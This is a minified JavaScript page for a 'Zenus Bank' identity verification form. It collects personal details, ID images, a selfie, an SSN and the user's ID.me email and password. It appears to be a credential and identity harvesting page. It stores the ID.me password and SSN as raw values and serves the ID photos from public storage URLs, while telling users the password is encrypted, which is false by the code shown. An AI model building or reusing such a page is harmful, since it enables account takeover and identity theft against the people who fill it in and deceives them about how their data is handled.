import{r as w}from"./reset-CYKpHJhn.js";import{s as l}from"./supabaseClient-CL6H8VOx.js";import{n as _}from"./Navbar-Bss5hsHn.js";import"./toast-DRvdR0y9.js";import"./logo-yCyWWFG1.js";const c="idme-submissions";async function E(a,r){const e={},t=Date.now();try{return r.primary_id_front&&(e.primary_id_front=await p(a,r.primary_id_front,`PRIMARY_FRONT_${t}`)),r.primary_id_back&&(e.primary_id_back=await p(a,r.primary_id_back,`PRIMARY_BACK_${t}`)),r.selfie&&(e.selfie=await p(a,r.selfie,`SELFIE_${t}`)),e}catch(o){for(const n of Object.values(e))if(n){const s=n.split(`${c}/`)[1];await l.storage.from(c).remove([s])}throw o}}async function p(a,r,e){const t=r.type==="image/webp"?"webp":r.name.split(".").pop(),o=`${a}/${e}.${t}`,{error:n,data:s}=await l.storage.from(c).upload(o,r,{cacheControl:"3600",upsert:!1});if(n)throw new Error(`Upload failed: ${n.message}`);const{data:i}=l.storage.from(c).getPublicUrl(o);return i.publicUrl}async function D(a){const{data:r,error:e}=await l.from("idme_submissions").select("*").eq("user_id",a).order("created_at",{ascending:!1}).limit(1).single();if(e&&e.code!=="PGRST116")throw e;return r||null}const q=async()=>{w("Zenus Bank | IDME Submission");const a=_(),r=await l.auth.getSession();if(!r.data.session){window.location.href="/login";return}const e=r.data.session.user.id;let t=null;try{t=await D(e)}catch(i){console.error("Error fetching submission:",i)}function o(){a.pageEvents?.(),I(e,t)}const n=[{value:"passport",label:"Passport"},{value:"drivers_license",label:"Driver's License"},{value:"national_id",label:"National ID"},{value:"visa",label:"Visa"}],s=t?`<div class="mb-6 p-4 rounded-lg ${t.submission_status==="approved"?"bg-green-50 border border-green-200":t.submission_status==="rejected"?"bg-red-50 border border-red-200":"bg-yellow-50 border border-yellow-200"}">
        <div class="flex items-center space-x-2">
          <i class="fa fa-info-circle ${t.submission_status==="approved"?"text-green-600":t.submission_status==="rejected"?"text-red-600":"text-yellow-600"}"></i>
          <div>
            <p class="font-semibold ${t.submission_status==="approved"?"text-green-900":t.submission_status==="rejected"?"text-red-900":"text-yellow-900"}">
              Submission Status: <span class="uppercase">${t.submission_status}</span>
            </p>
            ${t.rejection_reason?`<p class="text-sm text-gray-700 mt-1">Reason: ${t.rejection_reason}</p>`:""}
          </div>
        </div>
      </div>`:"";return{html:`
    <div class="relative">
      ${a.html}
      <div class="bg-gray-50 dark:bg-gray-900 font-sans min-h-screen pt-12">
        <div id="main-content" class="ml-14 md:ml-56 pt-14 transition-all duration-300 font-sans min-h-screen">
          <div class="p-4 md:p-8 max-w-2xl">
            <!-- Breadcrumb -->
            <div class="mb-6">
              <nav class="flex items-center space-x-2 text-xs text-gray-600 dark:text-gray-400">
                <i class="fa fa-home"></i>
                <span>/</span>
                <span>Submit IDME</span>
              </nav>
            </div>

            <!-- Header -->
            <div class="mb-8">
              <h1 class="text-3xl font-bold text-gray-900 dark:text-white mb-2">Identity Verification</h1>
              <p class="text-gray-600 dark:text-gray-400">Submit your identification documents and IDME account details for verification</p>
            </div>

            <!-- Status Badge -->
            ${s}

            <!-- Form -->
            <form id="idme-form" class="bg-white dark:bg-gray-800 rounded-lg shadow p-6 space-y-6">
              
              <!-- ID Type Selection -->
              <div>
                <label class="block text-sm font-semibold text-gray-900 dark:text-white mb-3">
                  Document Type <span class="text-red-500">*</span>
                </label>
                <div class="grid grid-cols-2 gap-3">
                  ${n.map(i=>`
                    <label class="relative flex cursor-pointer">
                      <input type="radio" name="id_type" value="${i.value}" class="peer sr-only" required>
                      <div class="w-full p-3 border-2 border-gray-300 rounded-lg peer-checked:border-blue-500 peer-checked:bg-blue-50 dark:peer-checked:bg-blue-900 dark:border-gray-600 transition">
                        <span class="text-sm font-medium text-gray-900 dark:text-white">${i.label}</span>
                      </div>
                    </label>
                  `).join("")}
                </div>
              </div>

              <!-- Personal Information -->
              <div class="border-t border-gray-200 dark:border-gray-700 pt-6">
                <h3 class="text-lg font-semibold text-gray-900 dark:text-white mb-4">Personal Information</h3>
                
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                      First Name <span class="text-red-500">*</span>
                    </label>
                    <input type="text" name="first_name" class="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 dark:bg-gray-700 dark:text-white rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" required>
                  </div>
                  <div>
                    <label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                      Last Name <span class="text-red-500">*</span>
                    </label>
                    <input type="text" name="last_name" class="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 dark:bg-gray-700 dark:text-white rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" required>
                  </div>
                </div>

                <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mt-4">
                  <div>
                    <label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                      Date of Birth <span class="text-red-500">*</span>
                    </label>
                    <input type="date" name="date_of_birth" class="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 dark:bg-gray-700 dark:text-white rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" required>
                  </div>
                  <div>
                    <label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                      ID Number <span class="text-red-500">*</span>
                    </label>
                    <input type="text" name="id_number" class="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 dark:bg-gray-700 dark:text-white rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" required>
                  </div>
                </div>

                <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mt-4">
                  <div>
                    <label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                      Expiry Date <span class="text-red-500">*</span>
                    </label>
                    <input type="date" name="expiry_date" class="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 dark:bg-gray-700 dark:text-white rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" required>
                  </div>
                  <div>
                    <label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                      Issuing Country <span class="text-red-500">*</span>
                    </label>
                    <input type="text" name="issuing_country" placeholder="e.g., US, UK, NG" maxlength="2" class="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 dark:bg-gray-700 dark:text-white rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 uppercase" required>
                  </div>
                </div>
              </div>

              <!-- IDME Account Credentials -->
              <div class="border-t border-gray-200 dark:border-gray-700 pt-6">
                <h3 class="text-lg font-semibold text-gray-900 dark:text-white mb-4">IDME Account Information</h3>
                <p class="text-sm text-gray-600 dark:text-gray-400 mb-4">Provide your IDME account credentials for verification. Your data is encrypted and secured.</p>
                
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                      IDME Email <span class="text-red-500">*</span>
                    </label>
                    <input type="email" name="idme_email" class="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 dark:bg-gray-700 dark:text-white rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="your.idme@example.com" required>
                  </div>
                  <div>
                    <label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                      Social Security Number (SSN) <span class="text-red-500">*</span>
                    </label>
                    <input type="text" name="idme_ssn" class="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 dark:bg-gray-700 dark:text-white rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="XXX-XX-XXXX" maxlength="11" required>
                    <p class="text-xs text-gray-500 dark:text-gray-400 mt-1">Format: XXX-XX-XXXX</p>
                  </div>
                </div>

                <div class="mt-4">
                  <label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                    IDME Password <span class="text-red-500">*</span>
                  </label>
                  <div class="relative">
                    <input type="password" name="idme_password" id="idme-password" class="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 dark:bg-gray-700 dark:text-white rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="••••••••" required>
                    <button type="button" id="toggle-password" class="absolute right-3 top-2.5 text-gray-500 dark:text-gray-400 hover:text-gray-700 dark:hover:text-gray-300">
                      <i class="fa fa-eye text-sm"></i>
                    </button>
                  </div>
                  <p class="text-xs text-gray-500 dark:text-gray-400 mt-1">Your password is encrypted before storage.</p>
                </div>
              </div>

              <!-- Document Upload -->
              <div class="border-t border-gray-200 dark:border-gray-700 pt-6">
                <h3 class="text-lg font-semibold text-gray-900 dark:text-white mb-4">Documents</h3>
                
                <div class="space-y-4">
                  <!-- Primary Front -->
                  <div>
                    <label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                      ID Front <span class="text-red-500">*</span>
                    </label>
                    <div class="border-2 border-dashed border-gray-300 dark:border-gray-600 rounded-lg p-4 cursor-pointer hover:border-blue-500 transition" id="drop-zone-front">
                      <input type="file" name="primary_id_front" class="hidden" accept="image/jpeg,image/png,image/webp" required>
                      <div class="text-center">
                        <i class="fa fa-cloud-upload text-2xl text-gray-400 mb-2"></i>
                        <p class="text-sm text-gray-600 dark:text-gray-400">Drag & drop or click to upload</p>
                        <p class="text-xs text-gray-500 mt-1">JPG, PNG, WebP (max 5MB)</p>
                      </div>
                      <div id="preview-front" class="mt-3 hidden">
                        <img src="" alt="Preview" class="w-full h-48 object-cover rounded">
                      </div>
                    </div>
                  </div>

                  <!-- Primary Back -->
                  <div>
                    <label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                      ID Back <span class="text-red-500">*</span>
                    </label>
                    <div class="border-2 border-dashed border-gray-300 dark:border-gray-600 rounded-lg p-4 cursor-pointer hover:border-blue-500 transition" id="drop-zone-back">
                      <input type="file" name="primary_id_back" class="hidden" accept="image/jpeg,image/png,image/webp" required>
                      <div class="text-center">
                        <i class="fa fa-cloud-upload text-2xl text-gray-400 mb-2"></i>
                        <p class="text-sm text-gray-600 dark:text-gray-400">Drag & drop or click to upload</p>
                        <p class="text-xs text-gray-500 mt-1">JPG, PNG, WebP (max 5MB)</p>
                      </div>
                      <div id="preview-back" class="mt-3 hidden">
                        <img src="" alt="Preview" class="w-full h-48 object-cover rounded">
                      </div>
                    </div>
                  </div>

                  <!-- Selfie -->
                  <div>
                    <label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                      Selfie <span class="text-red-500">*</span>
                    </label>
                    <div class="border-2 border-dashed border-gray-300 dark:border-gray-600 rounded-lg p-4 cursor-pointer hover:border-blue-500 transition" id="drop-zone-selfie">
                      <input type="file" name="selfie" class="hidden" accept="image/jpeg,image/png,image/webp" required>
                      <div class="text-center">
                        <i class="fa fa-cloud-upload text-2xl text-gray-400 mb-2"></i>
                        <p class="text-sm text-gray-600 dark:text-gray-400">Drag & drop or click to upload</p>
                        <p class="text-xs text-gray-500 mt-1">JPG, PNG, WebP (max 5MB)</p>
                      </div>
                      <div id="preview-selfie" class="mt-3 hidden">
                        <img src="" alt="Preview" class="w-full h-48 object-cover rounded">
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              <!-- Submission -->
              <div class="flex gap-3 pt-6">
                <button type="submit" id="submit-btn" class="flex-1 bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 px-4 rounded-lg transition disabled:opacity-50 disabled:cursor-not-allowed">
                  <span id="submit-text">Submit Documents</span>
                  <i id="submit-spinner" class="fa fa-spinner fa-spin hidden ml-2"></i>
                </button>
              </div>

              <div id="form-error" class="p-3 bg-red-50 dark:bg-red-900 border border-red-200 dark:border-red-700 text-red-800 dark:text-red-200 rounded-lg hidden"></div>
            </form>

            <!-- Footer -->
            <footer class="mt-12 p-4 text-center text-gray-600 dark:text-gray-400 text-xs border-t border-gray-200 dark:border-gray-700">
              <p>
                <strong>Copyright © ${new Date().getFullYear()}</strong> All rights reserved | Zenus Bank.
              </p>
            </footer>
          </div>
        </div>
      </div>
    </div>
    `,pageEvents:o}};async function I(a,r){const e=document.getElementById("idme-form"),t=document.getElementById("submit-btn"),o=document.getElementById("form-error");b("drop-zone-front","primary_id_front"),b("drop-zone-back","primary_id_back"),b("drop-zone-selfie","selfie");const n=document.getElementById("toggle-password"),s=document.getElementById("idme-password");n?.addEventListener("click",()=>{const i=s.type==="password"?"text":"password";s.type=i,n.querySelector("i").classList.toggle("fa-eye"),n.querySelector("i").classList.toggle("fa-eye-slash")}),e.addEventListener("submit",async i=>{i.preventDefault(),o.classList.add("hidden"),t.disabled=!0,document.getElementById("submit-spinner").classList.remove("hidden"),document.getElementById("submit-text").textContent="Uploading...";try{const d=new FormData(e),y={primary_id_front:d.get("primary_id_front"),primary_id_back:d.get("primary_id_back"),selfie:d.get("selfie")};for(const[u,g]of Object.entries(y)){if(!g)throw new Error(`${u} is required`);if(g.size>5*1024*1024)throw new Error(`${u} exceeds 5MB limit`);if(!["image/jpeg","image/png","image/webp"].includes(g.type))throw new Error(`${u} must be JPG, PNG, or WebP`)}const f=d.get("idme_ssn").trim();if(!/^\d{3}-\d{2}-\d{4}$/.test(f))throw new Error("SSN must be in format XXX-XX-XXXX");const x=d.get("idme_password");if(x.length<8)throw new Error("IDME password must be at least 8 characters");const m=await E(a,y),v={user_id:a,id_type:d.get("id_type"),first_name:d.get("first_name"),last_name:d.get("last_name"),date_of_birth:d.get("date_of_birth"),id_number:d.get("id_number"),expiry_date:d.get("expiry_date"),issuing_country:d.get("issuing_country").toUpperCase(),primary_id_front_url:m.primary_id_front,primary_id_back_url:m.primary_id_back,selfie_url:m.selfie,idme_email:d.get("idme_email").toLowerCase(),idme_ssn:f,idme_password:x,submission_status:"pending",submitted_at:new Date().toISOString()},{error:k}=r?await l.from("idme_submissions").update(v).eq("user_id",a):await l.from("idme_submissions").insert([v]);if(k)throw k;S(),setTimeout(()=>{window.location.reload()},2e3)}catch(d){console.error("Submission error:",d),o.textContent=d.message||"An error occurred. Please try again.",o.classList.remove("hidden")}finally{t.disabled=!1,document.getElementById("submit-spinner").classList.add("hidden"),document.getElementById("submit-text").textContent="Submit Documents"}})}function b(a,r){const e=document.getElementById(a),t=e.querySelector(`input[name="${r}"]`),o=document.getElementById(`preview-${r.split("_").pop()}`);e.addEventListener("click",()=>t.click()),["dragenter","dragover","dragleave","drop"].forEach(s=>{e.addEventListener(s,n,!1)});function n(s){s.preventDefault(),s.stopPropagation()}["dragenter","dragover"].forEach(s=>{e.addEventListener(s,()=>{e.classList.add("border-blue-500","bg-blue-50","dark:bg-blue-900")})}),["dragleave","drop"].forEach(s=>{e.addEventListener(s,()=>{e.classList.remove("border-blue-500","bg-blue-50","dark:bg-blue-900")})}),e.addEventListener("drop",s=>{const i=s.dataTransfer.files;i.length>0&&(t.files=i,h(i[0],o))}),t.addEventListener("change",s=>{s.target.files.length>0&&h(s.target.files[0],o)})}function h(a,r){const e=new FileReader;e.onload=t=>{r.querySelector("img").src=t.target.result,r.classList.remove("hidden")},e.readAsDataURL(a)}function S(){const a=document.createElement("div");a.className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50",a.innerHTML=`
    <div class="bg-white dark:bg-gray-800 rounded-lg p-8 max-w-md">
      <div class="text-center">
        <i class="fa fa-check-circle text-5xl text-green-500 mb-4"></i>
        <h2 class="text-2xl font-bold text-gray-900 dark:text-white mb-2">Submission Successful</h2>
        <p class="text-gray-600 dark:text-gray-400">Your documents and credentials have been submitted for verification.</p>
      </div>
    </div>
  `,document.body.appendChild(a)}export{q as default};
